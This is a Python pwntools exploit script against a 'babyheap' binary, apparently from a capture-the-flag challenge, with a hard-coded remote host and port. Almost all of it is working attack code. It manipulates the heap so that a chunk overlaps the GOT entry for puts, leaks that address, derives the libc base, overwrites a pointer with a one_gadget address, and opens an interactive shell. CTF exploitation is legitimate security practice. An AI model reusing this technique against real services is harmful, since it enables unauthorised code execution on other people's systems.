#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('babyheap')

host = args.HOST or '51.68.189.144'
port = int(args.PORT or 31005)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
break *0x{exe.entry:x}
continue
'''.format(**locals())

# -- Exploit goes here --

context.terminal = ['gnome-terminal', '-e']
io = start()

if args.LOCAL:
    libc = ELF('/lib64/libc.so.6')
    one_gadget = 0x443f7
else:
    libc = ELF('./libc.6.so')
    one_gadget = 0x47c46

def ch(s):
    io.sendafter('>', str(s))

ch(1)
ch(4)
ch(2)
io.sendafter('?', p64(0x6020A8))
ch(1)
ch(1337)
io.sendafter('Fill', "A" * 4 * 8 + p64(exe.got['puts']))
ch(3)
io.recvuntil('Content: ')
data = io.recvline().strip()
data = data + "\x00" * (8 - len(data))
addr = u64(data)
log.success(hex(addr))

libc.address = addr - libc.symbols['puts']
log.success(hex(libc.address))

ch(2)
io.sendafter('?', p64(libc.address + one_gadget))

io.interactive()

